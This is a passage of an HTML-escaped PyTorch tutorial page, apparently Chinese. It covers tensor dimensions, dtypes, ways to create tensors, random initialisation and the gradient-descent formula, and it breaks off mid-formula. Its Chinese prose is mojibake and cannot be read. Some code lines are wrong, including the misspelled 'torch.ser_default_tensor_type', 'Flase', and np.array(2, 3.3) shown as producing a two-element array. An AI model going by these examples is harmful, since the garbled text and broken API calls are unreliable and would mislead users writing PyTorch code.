&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;5.dim=4&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å››ç»´é€‚åˆå·ç§¯ç¥ç»ç½‘ç»œï¼Œå›¾ç‰‡çš„å­˜å‚¨ï¼Œ[b,c,h,w]ï¼Œå³batchï¼Œchannelï¼Œheightï¼Œwidth&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;g = torch.rand(2,3,28,28)
g.numel() # 4704ï¼Œæ•´ä¸ªç»´åº¦çš„å…ƒç´ çš„ä¸ªæ•°ï¼Œå³2*3*28*28
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;22-åˆ›å»ºtensor&#34;&gt;2.2 åˆ›å»ºTensor&lt;/h4&gt;
&lt;p&gt;ä¸€ä¸ªtensoré€šå¸¸åŒ…å«ä¸€ä¸‹å‡ ä¸ªå¸¸ç”¨å±æ€§ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;dtypeï¼Œå¸¸è§çš„æœ‰ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Data type&lt;/th&gt;
&lt;th&gt;dtype&lt;/th&gt;
&lt;th&gt;CPU tensor&lt;/th&gt;
&lt;th&gt;GPU tensor&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;32-bit floating point&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.float32&lt;/code&gt; or &lt;code&gt;torch.float&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.FloatTensor&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.cuda.FloatTensor&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;64-bit floating point&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.float64&lt;/code&gt; or &lt;code&gt;torch.double&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.DoubleTensor&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.cuda.DoubleTensor&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32-bit integer (signed)&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.int32&lt;/code&gt; or &lt;code&gt;torch.int&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.IntTensor&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.cuda.IntTensor&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;64-bit integer (signed)&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.int64&lt;/code&gt; or &lt;code&gt;torch.long&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.LongTensor&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.cuda.LongTensor&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;é€šè¿‡&lt;code&gt;torch.ser_default_tensor_type(torch.FloatTensor)&lt;/code&gt;ä¿®æ”¹é»˜è®¤çš„ç±»å‹ã€‚&lt;/p&gt;
&lt;p&gt;CPUä¸GPUç±»å‹çš„ç›¸äº’è½¬æ¢ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; torch.zeros([2, 4], dtype=torch.int32)
tensor([[ 0,  0,  0,  0],
        [ 0,  0,  0,  0]], dtype=torch.int32)
&amp;gt;&amp;gt;&amp;gt; cuda0 = torch.device(&#39;cuda:0&#39;)
&amp;gt;&amp;gt;&amp;gt; torch.ones([2, 4], dtype=torch.float64, device=cuda0)
tensor([[ 1.0000,  1.0000,  1.0000,  1.0000],
        [ 1.0000,  1.0000,  1.0000,  1.0000]], dtype=torch.float64, device=&#39;cuda:0&#39;)
# ä»cpu â€“&amp;gt; gpuï¼Œä½¿ç”¨data.cuda()å³å¯ã€‚
# è‹¥ä»gpu â€“&amp;gt; cpuï¼Œåˆ™ä½¿ç”¨data.cpu()ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;requires_grad=Flaseï¼Œå¯ä»¥å…ˆç†è§£æˆåœ¨è‡ªåŠ¨æ±‚æ¢¯åº¦çš„è¿‡ç¨‹ä¸­ï¼Œå¯¹äºè¯¥å±æ€§ä¸ºFalseçš„tensorä¸ä¼šè¿›è¡Œæ±‚è§£æ¢¯åº¦ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.shapeå±æ€§ï¼Œè¿”å›æ•°æ®çš„å°ºå¯¸&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¦‚ä½•åˆ›å»ºä¸€ä¸ªtensorï¼Œä¸»è¦æœ‰ä¸€ä¸‹å‡ ç§æ–¹æ³•ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ä»å…¶å®ƒç±»å‹è½¬æ¢&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.from_numpy(np.array(2, 3.3))
# ä»numpyè½¬æ¢ -&amp;gt; tensor([2.000, 3.300], dtype=torch.float64)

torch.tensor([2., 3.2]) 
# ä»listè½¬æ¢ï¼Œç±»å‹é»˜è®¤æ˜¯torch.FloatTensorï¼Œå¯ä»¥é€šè¿‡torch.ser_default_tensor_type(torch.FloatTensor)ä¿®æ”¹é»˜è®¤ç±»å‹
torch.tensor([2., 3.2], dtype=torch.float64)
# æˆ–è€…åˆ›å»ºæ—¶æŒ‡å®š
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœªåˆå§‹åŒ–Tensor&lt;/p&gt;
&lt;p&gt;ç”Ÿæˆæœªåˆå§‹åŒ–çš„æ•°æ®ï¼Œæ•°æ®åˆ†å¸ƒååˆ†ä¸è§„å¾‹ï¼Œåç»­ä¸€å®šè¦è¦†ç›–æ‰ã€‚ä¾‹å¦‚Torch.FloatTensor(d1,d2,d3)ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„&lt;code&gt;torch.Tensor()/torch.FloatTensor()&lt;/code&gt;æ¥æ”¶çš„å‚æ•°æ˜¯shapeç»´åº¦ï¼Œä¹Ÿå¯ä»¥æ¥æ”¶ç°æœ‰çš„æ•°æ®ä½†å¿…é¡»æ˜¯listï¼Œè€Œ&lt;code&gt;torch.tensor()&lt;/code&gt;åªæ¥æ”¶ç°æœ‰çš„æ•°æ®ï¼Œå»ºè®®ç”¨&lt;code&gt;torch.tensor()&lt;/code&gt;ç”¨ç°æœ‰çš„æ•°æ®åˆ›å»ºï¼Œç”¨&lt;code&gt;torch.Tensor()&lt;/code&gt;æ¥æ”¶shapeåˆ›å»ºã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;éšæœºåˆå§‹åŒ–Tensor&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;a = torch.rand(3,3) # 3x3çŸ©é˜µï¼Œæ¯ä¸ªéƒ½åœ¨[0,1]ä¹‹é—´

torch.rand_like(a) # ä¼šå°†å‚æ•°açš„shapeé€ç»™randå‡½æ•°

torch.randint(1,10,[3,3]) #min, max, shape

torch.empty(7, 19) # åˆ›å»º7x19çš„çŸ©é˜µ

torch.randn(3, 3) # 3x3çš„çŸ©é˜µï¼Œæ¯ä¸ªæ•°æ®éƒ½ç¬¦åˆN(0,1)çš„æ­£æ€åˆ†å¸ƒ

torch.normal() # ?

torch.full([2,3],0) # 2x3çš„å…ƒç´ å…¨éƒ¨ä¸º0
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;23-tensorå¸¸ç”¨æ–¹æ³•&#34;&gt;2.3 tensorå¸¸ç”¨æ–¹æ³•&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.reshape(input, (1, 2, 3, 4)) # è½¬æ¢ä¸ºå››ç»´
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3-æ¢¯åº¦&#34;&gt;3. æ¢¯åº¦&lt;/h3&gt;
&lt;p&gt;å¯¼æ•°å’Œåå¾®åˆ†åªèƒ½æ˜¯æè¿°çš„å‡½æ•°åœ¨è‡ªå˜é‡æ–¹å‘ä¸Šçš„å˜åŒ–çš„æƒ…å†µï¼Œæ˜¯ä¸€ä¸ªæ ‡é‡ï¼›è€Œæ¢¯åº¦å®šä¹‰ä¸ºä¸€ä¸ªå‘é‡ï¼Œå‘é‡çš„æ¯ä¸ªå…ƒç´ æ˜¯å¯¹ä¸åŒçš„è‡ªå˜é‡çš„åå¾®åˆ†ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ‡&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ‚&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ‚&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ‚&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ‚&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ‚&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ‚&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\nabla f = (\frac{\partial f}{\partial x_1}; \frac{\partial f}{\partial x_2}; ...; \frac{\partial f}{\partial x_n})
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ‡&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20744em;vertical-align:-0.8360000000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.3714399999999998em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;âˆ‚&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;âˆ‚&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.3714399999999998em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;âˆ‚&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;âˆ‚&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.3714399999999998em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;âˆ‚&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;âˆ‚&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬æˆ‘ä»¬éœ€è¦ç”¨æ¢¯åº¦å‡½æ•°çš„æå€¼ç‚¹ï¼Œé€šå¸¸æ˜¯æ˜¯æå°å€¼ï¼Œç”¨åˆ°çš„å…¬å¼å°±æ˜¯ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;Î¸&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;Î¸&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;Î±&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;âˆ‡&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;Î¸&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\theta_{t+1} = \theta_t - \alpha_t\nabla f(\theta_t)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.902771em;vertical-align:-0.208331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;Î¸&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.301108em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.208331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;Î¸&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;Î±&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;âˆ‡&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span 